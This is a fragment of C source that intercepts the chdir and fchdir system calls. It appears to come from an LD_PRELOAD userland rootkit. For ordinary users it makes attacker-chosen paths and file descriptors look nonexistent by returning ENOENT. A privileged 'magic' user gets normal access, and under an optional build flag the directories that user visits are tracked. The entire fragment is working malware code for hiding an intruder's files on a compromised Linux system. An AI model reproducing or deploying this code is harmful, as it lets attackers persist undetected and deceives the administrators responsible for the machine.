int chdir(const char *pathname){
    hook(CCHDIR);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        int ret = (long)call(CCHDIR, pathname);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd))
                if(!pathtracked(pathname))
                    trackwrite(pathname);
        }
        return ret;
#else
        return (long)call(CCHDIR, pathname);
#endif
    }
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCHDIR, pathname);
}

int fchdir(int fd){
    hook(CFCHDIR);
    if(magicusr()){
#ifdef HIDE_MY_ASS
        int ret = (long)call(CFCHDIR, fd);
        if(ret){
            int outfd = fileno(stdout);
            if(!outfd) return ret;
            if(isatty(outfd)){
                char *apath = gdirname(fd);
                if(!pathtracked(apath))
                    trackwrite(apath);
                free(apath);
            }
        }
        return ret;
#else
        return (long)call(CFCHDIR, fd);
#endif
    }
    if(hidden_fd(fd)) { errno = ENOENT; return -1; }
    return (long)call(CFCHDIR, fd);
}
